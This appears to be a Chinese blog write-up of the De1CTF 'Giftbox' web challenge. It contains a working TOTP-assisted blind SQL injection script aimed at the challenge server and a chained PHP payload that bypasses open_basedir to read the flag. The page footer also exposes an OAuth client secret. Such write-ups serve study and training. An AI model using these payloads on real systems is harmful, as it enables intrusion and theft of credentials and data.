@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            De1CTF-Giftbox题解
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Finance behind Passion in Security
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/friends/" class="menu-item-link">
+                        Friends
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/08/06/De1CTF-Giftbox题解/"> 
+                    De1CTF-Giftbox题解 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-08-06   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#De1CTF-Giftbox题解"><span class="toc-list-text">De1CTF-Giftbox题解</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#双因子认证"><span class="toc-list-text">双因子认证</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#注入"><span class="toc-list-text">注入</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#Bypass-open-dir"><span class="toc-list-text">Bypass open_dir</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="De1CTF-Giftbox题解"><a href="#De1CTF-Giftbox题解" class="headerlink" title="De1CTF-Giftbox题解"></a>De1CTF-Giftbox题解</h1><p>这次Web题的难度有阶层，<code>SSRF Me</code>是一个验签的绕过调用python的url_open进行ssrf请求、web4是一道n1ctf的原题，也懒得写wp了。还有两道比较难的，一道是ZSX师傅出的calc，统一三个后端的输出结果，过滤了括号。还有一道魔改了ciscn——2019的滑稽云，更改了溢出区的大小+外带结果。</p>
+<p>最后就是Giftbox，不得不说，这是我见过最有小情调的ctf题目。做了一个伪unix页面，存在几个bash命令，和一个登陆功能，在登陆处存在sql注入(需要经过双因子认证)。比赛的时候没做出来，趁着赛题没关复现一下(顺便膜爆恩泽师傅orz..)</p>
+<p><img src="http://static.zybuluo.com/1160307775/fa8kq5dg6w9kvypaq7gmtn5d/image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png" alt="image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png-979.2kB"></p>
+<h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><p>这种认证第一次见，其实是调用pyotp模块去验证，随便输入会报错<br><img src="http://static.zybuluo.com/1160307775/yqxk48t3uo4tmzrgjt4d30kg/image_1dhfn759ve4c17uv1eqv1rpq876m.png" alt="image_1dhfn759ve4c17uv1eqv1rpq876m.png-203.2kB"></p>
+<p>既然是前端发送验证请求，那就应该存在发送的ajax请求包。重点在开发者nodets和请求形式。它提示我们后端用了pyotp.zip的库去验证，而且在请求形式中把secret_key给了我们:<code>GAXG24JTMZXGKZBU</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/apyakaxxoilaq4ixhqk9ss1u/image_1dhfn9snj1dtme3d11eea3nm2v13.png" alt="image_1dhfn9snj1dtme3d11eea3nm2v13.png-165.3kB"></p>
+<p>队内师傅提醒说，python3的pyotp模块也可以根据key生成验证<br><img src="http://static.zybuluo.com/1160307775/k5n1ymx6sv0p2188k8r01wr3/image_1dhfniaosich1f5b1ptm1jk8t4s1g.png" alt="image_1dhfniaosich1f5b1ptm1jk8t4s1g.png-140.6kB"></p>
+<p>赛后看到天枢的师傅用xhr发送请求，即前端爆破就可以直接调用topt函数，也是种不错的思路，学习了。</p>
+<p>接着就是一个简单的注入</p>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>脚本如下，空格会导致程序判断为参数分隔符，所以用/**/替代</p>
+<pre><code>#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import requests
+import pyotp as pyotp
+import string
+
+totp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)
+
+
+def curl(payload):
+    r = requests.post(&#39;http://222.85.25.41:8090/shell.php&#39;, params={&#39;a&#39;: &#39;login admin\&#39;/**/and/**/(&#39; + payload + &#39;)/**/and/**/\&#39;1\&#39;=\&#39;1 admin&#39;, &#39;totp&#39;: totp.now()},
+                      data={&#39;dir&#39;: &#39;/&#39;, &#39;pos&#39;: &#39;/&#39;, &#39;filename&#39;: &#39;usage.md&#39;})
+    if &#39;password&#39; in r.text:
+        return True
+    else:
+        return False
+
+
+def sqli():
+    for i in range(0, 2):
+        # db_data = &quot;SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/LIMIT/**/{},1&quot;.format(
+        #     i)
+        # db_data = &quot;SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/and/**/table_name=\&#39;users\&#39;/**/LIMIT/**/{},1&quot;.format(
+        #     i)
+        db_data = &quot;select/**/password/**/from/**/giftbox.users/**/where/**/username/**/=/**/&#39;admin&#39;/**/limit/**/{},1&quot;.format(
+            i)
+        db_res = &quot;&quot;
+
+        for y in range(1, 64):
+            for c in string.printable:
+                db_res_payload = &quot;substr((&quot; + db_data + &quot;),%d,1)/**/=/**/&#39;%s&#39;&quot; % (y,c)
+                if curl(db_res_payload):
+                    db_res += c
+                    print(&quot;&gt; &quot; + db_res)
+                    break
+                else:pass
+            if db_res == &quot;&quot;:
+                break
+
+
+if __name__ == &#39;__main__&#39;:
+    sqli()</code></pre><p>最后注入password字段得到一个hint为<code>hinT{g1ve_u_hi33en_c0mm3nd-sh0w_hiiintttt_23333}</code>，登陆成功同时提示</p>
+<p><img src="http://static.zybuluo.com/1160307775/y3uyi4qslzpihrrxqpk5w7x1/image_1dhi8qiij18ve18991q95u1skfb1m.png" alt="image_1dhi8qiij18ve18991q95u1skfb1m.png-86kB"></p>
+<h2 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h2><p>同时题目存在targeting命令，具体用法如下。结合之前的提示，推测是对每一个target进行一次eval的操作，因为targeting不允许存在双引号，所以用复杂变量${xxx(xxx)}的形式代替</p>
+<p><img src="http://static.zybuluo.com/1160307775/4q86j7w2c84e21wjkvrk4bsr/image_1dhic3q29as9fln24sr29vts9.png" alt="image_1dhic3q29as9fln24sr29vts9.png-411.3kB"></p>
+<p>但是没有执行到system(whoami)，推测是有open_dir，用网上的方法bypass:<a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>
+<p>最后的payload如下，因为有长度限制，进行变量拼接</p>
+<pre><code>targeting a chdir
+targeting b css
+targeting c {$a($b)}
+targeting d ini_set
+targeting e open_basedir
+targeting f ..
+targeting g {$d($e,$f)}
+targeting h {$a($f)}
+targeting i {$a($f)}
+targeting j base64_
+targeting k decode
+targeting l $j$k
+targeting m Ly8v
+targeting n {$l($m)}
+targeting o {$d($e,$n)}
+targeting p print_r
+targeting q file_get_
+targeting r contents
+targeting s $q$r
+targeting t flag
+targeting u {$p($s($t))}
+launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvio5k3p7kn68w9o/image_1dhiec48lrbmsku1m3eu9pbjm2p.png" alt="image_1dhiec48lrbmsku1m3eu9pbjm2p.png-128.9kB"></p>
+<p>再次膜恩泽师傅..</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/">https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/07/29/CISCN 2019 Final Web11复盘/"> CISCN 2019 Final Web11题解 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Tue Aug 06 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
